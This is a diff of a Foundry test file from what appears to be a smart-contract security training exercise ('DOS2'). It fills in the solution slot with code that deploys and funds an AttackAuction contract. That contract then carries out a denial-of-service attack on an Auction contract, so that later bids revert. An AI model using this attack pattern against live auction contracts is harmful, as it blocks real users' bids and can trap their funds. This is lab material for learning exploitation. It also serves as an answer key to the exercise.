@@ -5,12 +5,12 @@ import "forge-std/Test.sol";
 import "forge-std/Vm.sol";
 import "forge-std/console.sol";
 import "src/dos-2/Auction.sol";
+import "src/dos-2/AttackAuction.sol";
 
 /**
  * @dev run "forge test -vvv --match-contract DOS2"
  */
 contract TestDOS2 is Test {
-
     uint256 constant USER1_FIRST_BID = 5 ether;
     uint256 constant USER2_FIRST_BID = 6.5 ether;
 
@@ -22,7 +22,9 @@ contract TestDOS2 is Test {
     Auction auction;
 
     function setUp() public {
-        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
+        /**
+         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
+         */
         vm.prank(deployer);
         auction = new Auction();
 
@@ -39,9 +41,19 @@ contract TestDOS2 is Test {
     }
 
     function testDosAttack() public {
-        /** CODE YOUR SOLUTION HERE */
-        
-        /** SUCCESS CONDITIONS */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
+        vm.startPrank(attacker);
+        AttackAuction attackAuction = new AttackAuction(address(auction));
+        vm.deal(address(attackAuction), 10 ether);
+        attackAuction.attack();
+
+        vm.stopPrank();
+
+        /**
+         * SUCCESS CONDITIONS
+         */
         uint256 highestBid = auction.highestBid();
         vm.startPrank(user2);
         vm.expectRevert();
